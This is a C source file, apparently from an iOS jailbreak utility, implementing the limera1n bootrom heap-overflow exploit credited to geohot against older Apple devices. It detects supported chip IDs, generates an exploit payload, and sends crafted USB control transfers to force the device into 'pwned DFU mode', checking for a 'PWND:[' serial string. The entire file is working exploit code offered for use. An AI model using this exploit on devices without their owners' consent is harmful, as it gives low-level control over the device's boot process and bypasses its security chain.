/*
 * limera1n.c - limera1n bootrom exploit discovered by geohot.
 * copyright (C) 2020/05/25 dora2ios
 *
 */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <limera1n.h>
#include <payload.h>
#include <client.h>

int limera1n_supported(irecv_client_t client) {
    const struct irecv_device_info* info = irecv_get_device_info(client);
    switch(info->cpid) {
        case 0x8920:
            return 0;
        case 0x8922:
            return 0;
        case 0x8930:
            return 0;
        default:
            return -1;
    }
    return 0;
}

int limera1n_exploit(irecv_client_t client) {
    printf("** exploiting with limera1n\n");
    printf("*** based on limera1n exploit (heap overflow) by geohot\n");
    
    unsigned char *payload;
    size_t payload_len;
    unsigned char assert[1];
    unsigned char buf[0x800];
    memset(buf, 'A', 0x800);
    int ret;
    int rom;
    
    uint16_t cpid = irecv_get_cpid();
    
    if(cpid == 0x8920){
        printf("iPhone 3GS is detected. Checking the Bootrom version.\n");
        rom = i3gs_bootrom(); // 0:old, 1:new
        if(rom == -1){
            printf("Failed to check bootrom version\n");
            return -1;
        }
        if(rom == 0){
            printf("Bootrom: old\n");
        }
        if(rom == 1){
            printf("Bootrom: new\n");
        }
    }
    
    if(cpid != 0x8920){
        rom = 2;
    }
    
    if(rom == -1){
        printf("Failed to get device infomation.\n");
        return -1;
    }
    
    ret = gen_limera1n(cpid, rom, &payload, &payload_len);
    if(ret == -1) {
        printf("Failed to generate payload.\n");
        irecv_close(client);
        return -1;
    }
    
    printf("Sending exploit payload\n");
    send_data(client, payload, payload_len);
    
    printf("Sending fake data\n");
    if(irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, assert, 1, 100) != 1){
        printf("Exploit failed! device is NOT in pwned DFU mode.\n");
        return -1;
    }
    irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 10000000);
    
    printf("Executing exploit\n");
    irecv_usb_control_transfer(client, 0x21, 2, 0, 0, NULL, 0, 100);
    irecv_reset(client);
    
    printf("Reconnecting to device\n");
    irecv_close(client);
    client = NULL;
    usleep(1000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    
    irecv_finish_transfer(client);
    printf("Exploit sent\n");
    
    printf("Reconnecting to device\n");
    irecv_close(client);
    client = NULL;
    usleep(1000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    
    free(payload);
    
    const struct irecv_device_info* info = irecv_get_device_info(client);
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        irecv_close(client);
        printf("Device not in pwned DFU mode.\n");
        return -1;
    }
    printf("Device is now in pwned DFU mode\n");
    irecv_close(client);
    return 0;
}

void limera1n_init() {
    exploit_add("limera1n", &limera1n_supported, &limera1n_exploit);
}

